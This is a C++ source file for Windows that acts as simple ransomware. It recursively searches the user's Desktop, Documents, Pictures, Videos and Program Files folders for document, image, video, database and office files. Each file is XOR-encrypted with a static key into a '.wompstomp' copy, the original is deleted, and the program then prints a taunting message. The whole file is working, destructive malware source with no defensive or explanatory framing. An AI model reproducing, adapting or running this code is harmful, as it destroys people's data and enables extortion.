#include <iostream>
#include <windows.h>
#include <fstream>
#include <vector>
#include <Shlobj.h>

bool filechec(const std::string& file_path, long long sizeLimit) {
    LARGE_INTEGER fileSize;
    HANDLE fileHandle = CreateFileA(file_path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fileHandle == INVALID_HANDLE_VALUE)
        return false;
    if (!GetFileSizeEx(fileHandle, &fileSize)) {
        CloseHandle(fileHandle);
        return false;
    }
    CloseHandle(fileHandle);
    return fileSize.QuadPart <= sizeLimit;
}

bool extchec(const std::string& file_path) {
    static const std::vector<std::string> eligibleExtensions = {
        "doc", "docx", "pdf", "odt", "rtf", "txt", "tex", "wpd", "wps", "md", 
        "html", "htm", "xhtml",

        "jpg", "jpeg", "png", "gif", "bmp", "tif", "tiff", "ico", "svg", "psd", 
        "raw", "heif", "heic",

        "mp4", "mov", "wmv", "flv", "avi", "mkv", "mpeg", "mpg", "h264", "vob", 
        "webm", "3gp",

        "db", "sql", "mdb", "accdb", "sqlite", "sqlite3", "db3", "csv", "dat", 
        "dbf", "log", "sav",

        "xls", "xlsx", "ppt", "pptx", "vsd", "ods", "odp", "numbers", "pages", 
        "key"
    };
    std::string ext = file_path.substr(file_path.find_last_of(".") + 1);
    for (const auto& eligibleExt : eligibleExtensions) {
        if (ext == eligibleExt) return true;
    }
    return false;
}

void encry(const std::string& file_path) {
    if (!filechec(file_path, 524288000)) //500mb
        return;

    std::ifstream input_file(file_path, std::ios::binary);
    if (!input_file.is_open())
        return;

    std::vector<unsigned char> buffer(std::istreambuf_iterator<char>(input_file), {});
    input_file.close();

    for (auto& byte : buffer) {
        byte ^= 0xAA;  //Static enc key
    }

    std::ofstream output_file(file_path + ".wompstomp", std::ios::binary);
    if (!output_file.is_open())
        return;

    output_file.write(reinterpret_cast<const char*>(buffer.data()), buffer.size());
    output_file.close();

    DeleteFileA(file_path.c_str()); //rm og file
}

void traverse(const std::string& directory) {
    std::string search_path = directory + "\\*";
    WIN32_FIND_DATAA fd;
    HANDLE hFind = ::FindFirstFileA(search_path.c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0) {
                    traverse(directory + "\\" + fd.cFileName);
                }
            } else {
                std::string file_path = directory + "\\" + fd.cFileName;
                if (extchec(file_path)) {
                    encry(file_path);
                }
            }
        } while (::FindNextFileA(hFind, &fd));
        ::FindClose(hFind);
    }
}

int main() {
    const char* folders[] = {"Desktop", "Documents", "Pictures", "Videos", "Program Files", "Program Files (x86)"}; //targets
    char userPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, userPath); 

    for (auto folder : folders) {
        std::string fullPath = std::string(userPath) + "\\" + folder;
        traverse(fullPath);
    }

    std::cout << "Womp Womp, your files were stomped.." << std::endl;
    system("pause");  
    return 0;
}
